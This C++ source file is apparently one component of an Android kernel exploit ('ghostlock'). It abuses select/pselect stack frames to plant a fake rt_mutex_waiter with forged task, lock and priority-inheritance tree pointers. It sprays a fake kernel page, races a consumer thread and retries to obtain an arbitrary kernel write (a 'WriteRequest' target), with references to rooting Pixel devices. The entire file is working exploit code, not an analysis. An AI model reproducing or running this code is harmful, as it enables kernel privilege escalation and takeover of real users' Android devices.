/**
 * @file route_select.cpp
 * @brief select/pselect 物理机制（自 core.cpp 按用途拆分，逐字保留）。
 */
#include "route_select.h"
#include "route.h"
#include "race.h"
#include "session.h"
#include "profile.h"
#include "support.h"
#include "log.h"
#include "memory.h"

/* ==== route/select_stack_route.cpp ==== */

#include <unistd.h>

#include <utility>

using namespace ghostlock;

namespace ghostlock::route::select_stack {
    SelectStackRoute::SelectStackRoute(const core::SelectInputs &inputs) noexcept
        : in(inputs) {
        /* The C version memset the whole context; zero the sets explicitly so a
   * destroy() before prepare() never tests uninitialized bits. */
        input_set.zero();
        output_set.zero();
        exception_set.zero();
        owned_input_set.zero();
        owned_output_set.zero();
        owned_exception_set.zero();
        status.code = ROUTE_RETRYABLE;
    }

    SelectStackRoute::SelectStackRoute(
        SelectStackRoute &&other) noexcept
        : in(other.in),
          input_set(other.input_set),
          output_set(other.output_set),
          exception_set(other.exception_set),
          owned_input_set(other.owned_input_set),
          owned_output_set(other.owned_output_set),
          owned_exception_set(other.owned_exception_set),
          pipe_read(std::move(other.pipe_read)),
          pipe_write(std::move(other.pipe_write)),
          block(std::move(other.block)),
          high_read(std::move(other.high_read)),
          block_borrows_pipe(other.block_borrows_pipe),
          selected_fds_installed(other.selected_fds_installed),
          consumer_stuck(other.consumer_stuck),
          calls(other.calls),
          successes(other.successes),
          select_result(other.select_result),
          select_errno(other.select_errno),
          status(other.status) {
    }

    int32_t SelectStackRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void SelectStackRoute::disarm() noexcept {
        in.race.consumer_go->store(0);
        if (in.race.consumer_inflight->load() != 0) {
            for (uint32_t i = 0;
                 i < in.disarm_spin && in.race.consumer_inflight->load() != 0;
                 i++) {
                usleep(in.disarm_poll_us);
            }
            consumer_stuck = in.race.consumer_inflight->load() != 0;
        }
        status.kernel_disarmed = !consumer_stuck;
    }

    void SelectStackRoute::retain_for_process_lifetime() noexcept {
        /* A stuck consumer may still walk these descriptors, so none of them may be
   * closed: hand every owner's descriptor to the process lifetime. */
        (void) high_read.release_to_process_lifetime("pselect consumer stuck");
        if (!block_borrows_pipe) {
            (void) block.release_to_process_lifetime("pselect consumer stuck");
        }
        (void) pipe_read.release_to_process_lifetime("pselect consumer stuck");
        (void) pipe_write.release_to_process_lifetime("pselect consumer stuck");
        /* The dup2-installed descriptors stay open as well: selected_fds_installed
   * remains set and nothing below closes them. */
    }

    void SelectStackRoute::destroy() noexcept {
        for (size_t fd = 0; fd < in.stdio_backup.size(); fd++) {
            if (in.stdio_backup[fd] >= 0)
                dup2(in.stdio_backup[fd], static_cast<int32_t>(fd));
        }
        if (consumer_stuck) {
            (void) fail(34, select_errno);
            status.code = ROUTE_DIRTY_FAILURE;
            retain_for_process_lifetime();
            return;
        }
        if (selected_fds_installed) {
            for (int32_t fd = 3; fd < in.nfds; fd++) {
                if (owned_input_set.test(fd) || owned_output_set.test(fd) ||
                    owned_exception_set.test(fd)) {
                    /* The fd number may also be owned by the pipe/timerfd members: drop
         * that owner before closing so nothing is closed twice. */
                    if (pipe_read.get() == fd) (void) pipe_read.release();
                    if (pipe_write.get() == fd) (void) pipe_write.release();
                    if (block.get() == fd) (void) block.release();
                    if (high_read.get() == fd) (void) high_read.release();
                    close(fd);
                }
            }
            selected_fds_installed = 0;
        }
        high_read.reset();
        if (!block_borrows_pipe) block.reset();
        pipe_read.reset();
        pipe_write.reset();
        status.userspace_clean = 1;
        if (status.code != ROUTE_OK && status.kernel_disarmed) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
    }
} // namespace ghostlock::route::select_stack

#if defined(__ANDROID__)

#include <array>
#include <ctime>
#include <iterator>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/timerfd.h>


/* The two Multicast stamp buffers intentionally remain dynamic stack frames.
 * Their layout/order is device-verified and must not become heap-backed STL. */
#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif


using namespace ghostlock;

namespace ghostlock::route {
    static double fops_elapsed_ms(struct timespec *ref) {
        return runtime_time::runtime_elapsed_ms(ref);
    }

    } // namespace ghostlock::route


namespace ghostlock::route {
    /* Public compatibility entry: lifecycle is now explicitly ordered while the
 * common route dispatcher remains scheduled for S14. */
    static uint32_t route_delay_usec(const select_stack::SelectStackRoute *context,
                                int32_t attempt) {
        if (!context->in.compact_waiter) {
            (void) attempt;
            /* Let select establish its frame and stamp the crafted waiter before
         * the PI walk fires. */
            return context->in.enter_delay_us;
        }
        /* Compact retry walks a delay ladder (U01/SELECT-01, mirroring the
     * upstream 50d2b72 candidate list); the profile's enter delay seeds the
     * first attempt. The ladder stays native-side until a Select device can
     * validate a schema extension. */
        const uint32_t seed = context->in.enter_delay_us;
        const uint32_t *delays = context->in.delay_ladder;
        const uint32_t count = context->in.delay_ladder_len;
        if (!delays || count == 0) return seed;
        const uint32_t ladder =
            delays[static_cast<uint32_t>(attempt - 1) % count];
        return attempt == 1 && seed != 0 ? seed : ladder;
    }

    void fdset_put_word(fd_set *set, int32_t word, uint64_t value) {
        unsigned long *bits = reinterpret_cast<unsigned long *>(set);
        bits[word] = static_cast<unsigned long>(value);
    }

    uint64_t fdset_get_word(const fd_set *set, int32_t word) {
        const unsigned long *bits = reinterpret_cast<const unsigned long *>(set);
        return bits[word];
    }

    static int32_t pselect_words_per_set(int32_t nfds) {
        int32_t bits_per_word = static_cast<int32_t>(8 * sizeof(unsigned long));
        return (nfds + bits_per_word - 1) / bits_per_word;
    }

    static int32_t pselect_put_global_word(
        fd_set *in, fd_set *out, fd_set *ex, int32_t words_per_set,
        int32_t global_word, uint64_t value) {
        if (global_word < 0) {
            return 0;
        }

        int32_t set_idx = global_word / words_per_set;
        int32_t word_idx = global_word % words_per_set;
        switch (set_idx) {
            case 0:
                fdset_put_word(in, word_idx, value);
                return 1;
            case 1:
                fdset_put_word(out, word_idx, value);
                return 1;
            case 2:
                fdset_put_word(ex, word_idx, value);
                return 1;
            default:
                return 0;
        }
    }

    static int32_t pselect_waiter_shift(const select_stack::SelectStackRoute *context) {
        return context->in.waiter_shift;
    }

    static void pselect_put_waiter_word(
        select_stack::SelectStackRoute *context, int32_t words_per_set,
        int32_t waiter_word, uint64_t value, const char *name) {
        int32_t global_word = pselect_waiter_shift(context) + waiter_word;
        int32_t placed = pselect_put_global_word(
            context->input_set.raw(), context->output_set.raw(),
            context->exception_set.raw(),
            words_per_set, global_word, value);
        if (!placed) {
            pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
                       "words_per_set=%d nfds=%d\n",
                       name, waiter_word, global_word, words_per_set,
                       context->in.nfds);
        }
    }

    static void open_selected_fds(
        fd_set *in, fd_set *out, fd_set *ex, int32_t read_fd, int32_t write_fd,
        int32_t nfds) {
        /* every bit lands on the read end so select/pselect parks the full window */
        (void) write_fd;
        int32_t high_read = fcntl(read_fd, F_DUPFD, nfds + 32);
        if (high_read < 0) {
            pr_warning("pselect F_DUPFD read errno=%d\n", errno);
            return;
        }
        for (int32_t fd = 0; fd < nfds; fd++) {
            if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
                dup2(high_read, fd);
            }
        }
        close(high_read);
        dup2(read_fd, nfds - 1);
        FD_SET(nfds - 1, ex);
    }

    static std::array<int32_t, 3> standard_io_backup = {-1, -1, -1};

    std::array<std::int32_t, 3> standard_io_backup_snapshot() {
        return standard_io_backup;
    }

    void reserve_standard_io(std::int32_t nfds) {
        for (int32_t fd = 0; fd < static_cast<int32_t>(standard_io_backup.size()); fd++) {
            if (standard_io_backup[static_cast<size_t>(fd)] >= 0) continue;
            int32_t backup = fcntl(fd, F_DUPFD, nfds + 64);
            if (backup < 0) {
                pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
            } else {
                standard_io_backup[static_cast<size_t>(fd)] = backup;
            }
        }
    }

    static void restore_standard_io(const std::array<int32_t, 3> &backup) {
        for (size_t fd = 0; fd < backup.size(); fd++) {
            if (backup[fd] < 0) continue;
            dup2(backup[fd], static_cast<int32_t>(fd));
        }
    }

    static void select_stack_build_fdsets(select_stack::SelectStackRoute *context) {
        select_stack::FdSet *inset = &context->input_set;
        select_stack::FdSet *out = &context->output_set;
        select_stack::FdSet *ex = &context->exception_set;
        inset->zero();
        out->zero();
        ex->zero();

        int32_t words_per_set = pselect_words_per_set(context->in.nfds);
        int32_t compact = context->in.compact_waiter;

        struct pselect_waiter_word {
            int32_t word;
            uint64_t value;
            const char *name;
        };

        if (compact) {
            /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
         * the write value, children the write target; waiter->task is the
         * payload fake_task (planted fields for the PI walk). */
            struct pselect_waiter_word words[] = {
                {2, (context->in.page.fake_right), "tree_pc"},
                {3, 0, "tree_right"},
                {4, context->in.request.target, "tree_left"},
                {5, (context->in.page.fake_right), "pi_pc"},
                {6, 0, "pi_right"},
                {7, context->in.request.target, "pi_left"},
                {8, (context->in.page.fake_task), "task"},
                {9, (context->in.page.fake_lock), "lock"},
                {10, (static_cast<uint64_t>(context->in.waiter_prio) << 32) |
                         context->in.waiter_wake_prio_low_bits,
                 "wake_prio"},
                {11, 0, "deadline"},
                {12, 0, "ww_ctx"},
            };
            for (size_t i = 0; i < std::size(words); i++) {
                struct pselect_waiter_word *w = &words[i];
                pselect_put_waiter_word(context, words_per_set,
                                        w->word, w->value, w->name);
            }
        } else {
            /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
            struct pselect_waiter_word words[] = {
                {2, 0, "tree_pc"},
                {3, 0, "tree_right"},
                {4, 0, "tree_left"},
                {5, context->in.waiter_tree_prio, "tree_prio"},
                {6, 0, "tree_deadline"},
                {7, 0, "pi_parent"},
                {8, 0, "pi_right"},
                {9, 0, "pi_left"},
                {10, context->in.waiter_pi_prio, "pi_prio"},
                {11, 0, "pi_deadline"},
                {12, (context->in.page.fake_task), "task"},
                {13, (context->in.page.fake_lock), "lock"},
                {14, context->in.waiter_wake_state, "wake_state"},
            };
            for (size_t i = 0; i < std::size(words); i++) {
                struct pselect_waiter_word *w = &words[i];
                pselect_put_waiter_word(context, words_per_set,
                                        w->word, w->value, w->name);
            }
        }
    }
} // namespace ghostlock::route

namespace ghostlock::route::select_stack {
    int32_t SelectStackRoute::prepare() noexcept {
        if (!(in.page.base) || !(in.page.fake_lock) || !
            (in.page.fake_fops)) {
            pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
                       "fops=%016zx\n", (in.page.base),
                       (in.page.fake_lock),
                       (in.page.fake_fops));
            return fail(30, 0);
        }
        int32_t fds[2];
        if (pipe(fds) != 0) {
            return fail(31, errno);
        }
        pipe_read.reset(fds[0]);
        pipe_write.reset(fds[1]);

        /* Both routes park on a never-ready timerfd: the waiter must stay stale
     * on the pselect stack for the whole consumer window. */
        block.reset(static_cast<int32_t>(syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC)));
        if (!block.valid()) {
            pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                       errno);
            block_borrows_pipe = 1;
        }
        high_read.reset(fcntl(block_fd(), F_DUPFD_CLOEXEC, in.nfds + 16));
        if (!high_read.valid()) {
            pr_warning("pselect F_DUPFD read errno=%d\n", errno);
            return fail(32, errno);
        }

        route::select_stack_build_fdsets(this);
        pr_info("pselect route setup shift=%d page=%016zx "
                "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
                "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
                "ex1=%016llx ex2=%016llx ex3=%016llx\n",
                route::pselect_waiter_shift(this),
                (in.page.base), (in.page.fake_lock),
                (in.page.fake_w0), (in.page.fake_task),
                (unsigned long long) route::fdset_get_word(input_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(input_set.raw(), 3),
                (unsigned long long) route::fdset_get_word(output_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 1),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 2),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 3));

        /* The route may replace low fds, including stdout and stderr. */
        route::open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
                                 high_read.get(), pipe_write.get(), in.nfds);
        owned_input_set = input_set;
        owned_output_set = output_set;
        owned_exception_set = exception_set;
        high_read.reset();
        selected_fds_installed = 1;
        return 0;
    }

    route::RouteStatus SelectStackRoute::execute() noexcept {
        struct timespec route_t0;
        clock_gettime(CLOCK_MONOTONIC, &route_t0);

        /* Compact retries rebuild the payload page between attempts (U01/SELECT-01,
     * mirroring upstream 50d2b72): a lost race clobbers the page, so every
     * attempt resprays and re-derives fake_* before rebuilding the fd_sets.
     * The consumer handshake advances consumer_go per attempt so the trigger
     * is seen as a new sequence. */
        const int32_t attempts = static_cast<int32_t>(
            in.compact_waiter ? in.attempts_compact : in.attempts_plain);
        int32_t calls_total = 0;
        int32_t successes_total = 0;

        for (int32_t attempt = 1; attempt <= attempts; attempt++) {
            if (attempt > 1) {
                const uintptr_t rebuilt = support::prepare_good_kernel_page(*in.spray);
                if (!rebuilt || !(in.page.fake_lock) ||
                    !(in.page.fake_fops)) {
                    pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
                    (void) fail(35, errno);
                    break;
                }
                route::select_stack_build_fdsets(this);
                route::open_selected_fds(input_set.raw(), output_set.raw(),
                                         exception_set.raw(), block_fd(), pipe_write.get(),
                                         in.nfds);
                owned_input_set = input_set;
                owned_output_set = output_set;
                owned_exception_set = exception_set;
            }

            in.race.consumer_calls->store(0);
            in.race.consumer_success->store(0);
            in.race.consumer_stop->store(0);
            uint32_t delay_usec = route::route_delay_usec(this, attempt);
            in.race.route_delay_usec->store(delay_usec);
            in.race.consumer_go->store(attempt);

            pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
                    attempt, attempts, in.compact_waiter,
                    route::fops_elapsed_ms(&route_t0));
            errno = 0;
            if (in.compact_waiter) {
                uint32_t timeout_us = in.timeout_us;
                struct timespec ts = {
                    .tv_sec = timeout_us / 1000000,
                    .tv_nsec = (long) (timeout_us % 1000000) * 1000,
                };
                select_result = pselect(
                    in.nfds, input_set.raw(), output_set.raw(),
                    exception_set.raw(), &ts, nullptr);
            } else {
                uint32_t timeout_us = in.timeout_us;
                struct timeval timeout = {
                    .tv_sec = timeout_us / 1000000,
                    .tv_usec = timeout_us % 1000000,
                };
                select_result = select(
                    in.nfds, input_set.raw(), output_set.raw(),
                    exception_set.raw(), &timeout);
            }
            select_errno = errno;
            route::restore_standard_io(in.stdio_backup);
            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
                    attempt, attempts, in.compact_waiter,
                    route::fops_elapsed_ms(&route_t0), select_result);
            in.race.consumer_go->store(0);

            const int32_t calls = in.race.consumer_calls->load();
            const int32_t successes = in.race.consumer_success->load();
            calls_total += calls;
            successes_total += successes;
            if (calls > 0 && successes > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
                break;
            }
            (void) fail(33, select_errno);
        }
        calls = calls_total;
        successes = successes_total;
        return status;
    }
} // namespace ghostlock::route::select_stack

namespace ghostlock::route {
    route::RouteStatus do_pselect_fake_lock_route(const core::SelectInputs &in) {
        /* U01/SELECT-01: SelectStackRoute::execute() now retries compact routes
     * four times, rebuilding the payload page and fd_sets per attempt and
     * advancing the consumer handshake. The delay ladder and the attempt
     * count stay native-side until a Select device can validate a
     * profile-schema extension; the profile still owns the timeout. */
        select_stack::SelectStackRoute context(in);
        const route::RouteStatus status = run_route_lifecycle(context);
        if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 34) {
            pr_error("pselect consumer still inflight; leaking route fds\n");
        }

        pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d\n", context.calls, context.successes,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number);
        return status;
    }

    /**
     * @brief 会话适配器：唯一读取 `g_exploit_session` 的位置（Kotlin 传参落地后删除）。
     */
    route::RouteStatus do_pselect_route_from_session(const memory::WriteRequest *request) {
        auto &s = session::g_exploit_session;
        const profile::SelectStackLayout layout = s.profile.select_stack_layout();
        core::PageSprayInputs spray =
            support::page_spray_inputs_from_session(request ? *request : memory::WriteRequest{});
        core::SelectInputs in{
            .page = {
                .base = (s.heap.current.base),
                .last_mm_struct = (s.heap.current.last_mm_struct),
                .fake_lock = (s.heap.current.fake_lock),
                .fake_w0 = (s.heap.current.fake_w0),
                .fake_task = (s.heap.current.fake_task),
                .fake_parent = (s.heap.current.fake_parent),
                .fake_right = (s.heap.current.fake_right),
                .fake_left = (s.heap.current.fake_left),
                .fake_fops = (s.heap.current.fake_fops),
            },
            .race = {
                .consumer_calls = &s.race.consumer_calls,
                .consumer_success = &s.race.consumer_success,
                .consumer_stop = &s.race.consumer_stop,
                .consumer_go = &s.race.consumer_go,
                .consumer_inflight = &s.race.consumer_inflight,
                .waiter_tid = &s.race.waiter_tid,
                .route_delay_usec = &s.race.route_delay_usec,
            },
            .request = request ? *request : memory::WriteRequest{},
            .waiter_shift = s.profile.loaded()
                                ? layout.waiter_shift.value_or(0)
                                : kernel::PSELECT_WAITER_WORD_SHIFT,
            .compact_waiter = layout.compact_waiter.value_or(0) ? 1 : 0,
            .timeout_us = s.profile.select_timeout_us(),
            .enter_delay_us = s.profile.select_enter_delay_us(),
            .waiter_prio = kernel::FAKE_WAITER_PRIO,
            .nfds = PSELECT_ROUTE_NFDS,
            .stdio_backup = standard_io_backup,
            .spray = &spray,
            /* TODO(P3-kotlin-params)：以下投影值在 Kotlin 传参落地后由 profile 提供。 */
            .attempts_compact = 4,
            .attempts_plain = 1,
            .disarm_spin = 2000,
            .disarm_poll_us = 1000,
            .delay_ladder = core::kSelectDelayLadderUs.data(),
            .delay_ladder_len = static_cast<std::uint32_t>(core::kSelectDelayLadderUs.size()),
            .waiter_wake_prio_low_bits = 3,
            .waiter_tree_prio = 1,
            .waiter_pi_prio = 1,
            .waiter_wake_state = 3,
        };
        return do_pselect_fake_lock_route(in);
    }
} // namespace ghostlock::route
#endif // __ANDROID__
